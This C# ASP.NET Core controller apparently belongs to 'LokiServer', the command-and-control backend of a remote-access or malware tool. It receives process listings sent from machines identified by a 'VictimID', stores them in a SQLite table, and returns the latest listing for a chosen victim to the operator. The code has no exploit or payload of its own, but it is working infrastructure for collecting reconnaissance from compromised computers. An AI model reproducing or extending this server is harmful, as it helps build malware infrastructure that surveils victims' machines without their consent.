using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System.Data;
using System.Data.SQLite;
using System.Text;

namespace LokiServer.Controllers
{
    public class ListProcessequest
    {
        public string id { get; set; }
        public string processes { get; set; }
    }

    public class ProcessOutput
    {
        public string Output { get; set; }
    }

    public class getProcessRequest
    {
        public string id { get; set; }
    }

    [ApiController]
    [Route("[controller]")]
    public class ProcessController : Controller
    {
        [HttpPost]
        public IActionResult Post([FromBody] ListProcessequest request)
        {
            if (request.id == null)
            {
                return BadRequest();
            }
            SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
            conn.Open();
            string sql = "INSERT INTO Output (VictimID, ActionID, Output) VALUES (@id, 2, @processes)";
            SQLiteCommand command = new SQLiteCommand(sql, conn);
            command.Parameters.AddWithValue("@id", request.id);
            command.Parameters.AddWithValue("@processes", request.processes);
            command.ExecuteNonQuery();
            conn.Close();
            return Ok();
        }

        [HttpPost("Get")]
        public ProcessOutput GetRequest([FromBody] getProcessRequest request)
        {
            if (request.id == null)
            {
                return null; // Returning null indicates a bad request
            }

            using (SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;"))
            {
                conn.Open();

                string sql = "SELECT Output FROM Output WHERE VictimID = @id AND ActionID = 2 ORDER BY ID DESC LIMIT 1";
                using (SQLiteCommand command = new SQLiteCommand(sql, conn))
                {
                    command.Parameters.AddWithValue("@id", request.id);

                    using (SQLiteDataAdapter adapter = new SQLiteDataAdapter(command))
                    {
                        DataTable dt = new DataTable();
                        adapter.Fill(dt);

                        if (dt.Rows.Count > 0)
                        {
                            ProcessOutput output = new ProcessOutput();
                            foreach (DataRow row in dt.Rows)
                            {
                                output.Output = row["Output"].ToString();
                                //output.Output = output.Output.Replace("!", ":");
                                //output.Output = output.Output.Replace(",", ".");
                                // remove the [ ] from the string
                            }
                            return output;
                        }
                    }
                }
            }

            return null; // Returning null indicates no data found
        }

    }
}
